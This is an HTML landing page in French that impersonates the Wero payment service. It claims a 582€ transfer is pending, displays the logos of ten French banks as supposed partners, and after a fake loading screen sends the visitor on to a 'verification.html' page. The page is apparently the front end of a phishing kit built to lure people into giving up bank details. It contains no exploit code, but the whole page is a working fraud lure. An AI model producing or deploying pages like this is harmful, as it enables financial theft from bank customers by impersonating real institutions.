<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Instant Sécurisé</title>
    
    <style>
        :root {
            --jaune-fond: #ffe680;
            --jaune-accent: #fff4c2;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--jaune-fond);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            color: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.12);
            max-width: 460px;
            width: 100%;
            overflow: hidden;
            text-align: center;
            padding-bottom: 30px;
        }
        .header {
            background: var(--jaune-accent);
            padding: 20px 0;
            display: flex;
            align-items: center;
            justify-content: flex-start;
        }
        .logo-img {
            width: 60px;
            height: 60px;
            margin-left: 20px;
            object-fit: contain;
        }
        .subtitle { font-size: 1.1rem; color: #333; margin-left: 15px; }
        .content { padding: 30px 24px; }
        h1 { font-size: 1.9rem; margin: 0 0 20px; color: #111; }
        .checkmark { width: 100px; height: 100px; background: #4CAF50; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; box-shadow: 0 8px 20px rgba(76,175,80,0.25); }
        .checkmark::after { content: "✓"; font-size: 5rem; color: white; font-weight: bold; }
        .message { font-size: 1.15rem; line-height: 1.5; margin: 20px 0 30px; color: #444; }
        .highlight { color: #0066cc; font-weight: bold; }
        .btn { background: var(--jaune-accent); color: #000; font-size: 1.2rem; font-weight: bold; padding: 16px 60px; border-radius: 50px; border: none; cursor: pointer; margin: 20px 0 40px; transition: all 0.2s; box-shadow: 0 6px 15px rgba(255,244,194,0.5); }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(255,244,194,0.7); }
        .partners-title { font-size: 0.95rem; color: #666; margin-bottom: 15px; }
        .logos {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px 18px;
            max-width: 420px;
            margin: 0 auto;
        }
        .logo-item {
            width: 80px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            padding: 8px;
        }
        .logo-item img { max-width: 100%; max-height: 100%; object-fit: contain; }
        .footer { font-size: 0.85rem; color: #777; margin-top: 30px; line-height: 1.6; }
        .footer a { color: #0066cc; margin: 0 8px; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
        #loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #ffffff; display: none; flex-direction: column;
            justify-content: center; align-items: center; z-index: 9999;
        }
        .loader-container { text-align: center; width: 90%; max-width: 600px; }
        .flex-row { display: flex; align-items: center; justify-content: center; gap: 30px; margin-bottom: 50px; flex-wrap: nowrap; }
        .image-box { max-width: 140px; max-height: 140px; border-radius: 16px; overflow: hidden; box-shadow: 0 6px 20px rgba(0,0,0,0.12); flex-shrink: 0; }
        .image-box img { width: 100%; height: 100%; object-fit: contain; }
        .arrow { font-size: 4rem; color: #000; font-weight: bold; min-width: 60px; }
        .loading-text { font-size: 1.8rem; font-weight: bold; color: #000; letter-spacing: 1px; position: relative; }
        .loading-text::after { content: "."; animation: dots 1.5s steps(4, end) infinite; }
        @keyframes dots { 0% { content: "."; } 33% { content: ".."; } 66% { content: "..."; } 100% { content: "."; } }
        @media (max-width: 500px) { .flex-row { gap: 20px; } .image-box { max-width: 110px; max-height: 110px; } .arrow { font-size: 3rem; } .loading-text { font-size: 1.6rem; } }
        @media (max-width: 480px) { .card { max-width: 100%; padding: 20px 16px; } .logo-item { width: 70px; height: 45px; padding: 6px; } }
    </style>
</head>
<body>

    <div class="card">
        <div class="header">
            <img src="https://i.postimg.cc/3rvSQHBz/IMG-7193.jpg" alt="Wero Logo" class="logo-img">
        </div>
        
        <div class="content">
            <h1>Instant Sécurisé.</h1>
            <div class="checkmark"></div>
            <p class="message">
                VOUS AVEZ UN VIREMENT WERO DE <span id="montant-display" class="highlight">582</span>€ EN ATTENTE
            </p>
            <p class="message" style="font-size:1.05rem;">
                Pour le recevoir directement sur le compte de votre choix.
            </p>
            <button id="continuer-btn" class="btn">CONTINUER</button>
            
            <div class="partners">
                <div class="partners-title">Ce service vous est proposé par :</div>
                <div class="logos">
                    <div class="logo-item"><img src="https://i.postimg.cc/sgmvS1XN/agricole.png" alt="Crédit Agricole"></div>
                    <div class="logo-item"><img src="https://i.postimg.cc/dQhHxycG/bnp.png" alt="BNP Paribas"></div>
                    <div class="logo-item"><img src="https://i.postimg.cc/28vHzN66/caisse.png" alt="Caisse d'Épargne"></div>
                    <div class="logo-item"><img src="https://i.postimg.cc/2SD0y9bx/cic.png" alt="CIC"></div>
                    <div class="logo-item"><img src="https://i.postimg.cc/859HSZgM/hello.png" alt="Arkéa"></div>
                    <div class="logo-item"><img src="https://i.postimg.cc/y63jPC0P/lcl.png" alt="LCL"></div>
                    <div class="logo-item"><img src="https://i.postimg.cc/Gh0QggQ1/arkea.png" alt="Arkéa"></div>
                    <div class="logo-item"><img src="https://i.postimg.cc/YCMxM4Zn/mutuel.png" alt="Crédit Mutuel"></div>
                    <div class="logo-item"><img src="https://i.postimg.cc/nh2GzFtH/postal.png" alt="La Banque Postale"></div>
                    <div class="logo-item"><img src="https://i.postimg.cc/zffSHsJT/societe.png" alt="Société Générale"></div>
                </div>
            </div>
            
            <div class="footer">
                <a href="#">Mentions légales</a> | 
                <a href="#">FAQ</a> | 
                <a href="#">CGU</a> | 
                <a href="#">Cookies et données</a> | 
                <a href="#">Se désinscrire</a>
            </div>
        </div>
    </div>

    <div id="loader">
        <div class="loader-container">
            <div class="flex-row">
                <div class="image-box">
                    <img src="https://i.postimg.cc/jSTLYbWt/téléchargement.png" alt="Wero">
                </div>
                <div class="arrow">→</div>
                <div class="image-box">
                    <img src="https://i.postimg.cc/hvN9wFcd/virement_banacaire.png" alt="Banque">
                </div>
            </div>
            <div class="loading-text">Chargement</div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        let montant = urlParams.get('montant') || '582';
        document.getElementById('montant-display').textContent = montant;

        document.getElementById('continuer-btn').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('loader').style.display = 'flex';
            document.querySelector('.card').style.display = 'none';
            setTimeout(function() {
                window.location.href = 'verification.html?montant=' + montant;
            }, 3500);
        });
    </script>

</body>
</html>
